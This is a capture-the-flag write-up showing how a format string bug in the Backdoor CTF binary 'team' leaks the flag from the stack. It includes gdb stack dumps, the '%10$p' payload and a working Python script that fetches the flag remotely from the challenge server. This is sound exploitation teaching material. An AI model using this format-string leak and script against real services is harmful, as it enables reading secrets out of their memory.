### Solved by barrebas

Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here's how we solved `team` for 600 points.

The binary we've been given is a 32-bit ELF. The output of strings doesn't give us much. Using `strace ./team`, it becomes clear that the binary reads from `flag.txt` so I created one locally. I echoed `flag1` to the file and restarted the binary.

It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from `flag.txt`. Then, it compares the user input to the flag using `strcmp`. 

The team name is then printed using `printf`: this is vulnerable to a format string vulnerability:

```
bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: TEAM%llp
Enter flag: FLAG%llp
TEAM0x64 : incorrect flag. Try again.
```

Okay, so let's have a look at the stack when we reach `printf`. It gets called at `8048711` to print the team name.

```
Breakpoint 1, 0x08048711 in ?? ()
gdb-peda$ x/40wx $esp
0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
```

What's this then? From breakpointing `strcmp`, I learned that the flag was on the stack. In fact, it's within reach of the format string vulnerability!

```
0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
                          flag1 >>>   g a l f           1
```

That's too easy, right? Wrong! The flag starts at `%10$p`:

```bash
bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: %10$p
Enter flag: bleh
0x67616c66 : incorrect flag. Try again.
```

It worked remotely with this script:


```python
from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)
    
def pwn(n):
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('hack.bckdr.in', 8004))
    
    readtil('teamname: ')
    sendln("AAAA%"+str(n)+"$p")
    readtil('flag: ')
    sendln("CTF_TEAM_VULNHUB")
    data = readtil('again.')

    s.close()
    m = re.findall(r'0x([0-9a-f]*) :', data)
    return m[0]
    
full = ''
for i in xrange(10, 30):
    full += pwn(i).decode('hex')[::-1]
    print full
```

This spits out the flag until it hits something it can't hex decode. Because the CTF is long-lived, we won't post any flags. 

Far too easy for a 600 point challenge, but we're not complaining...

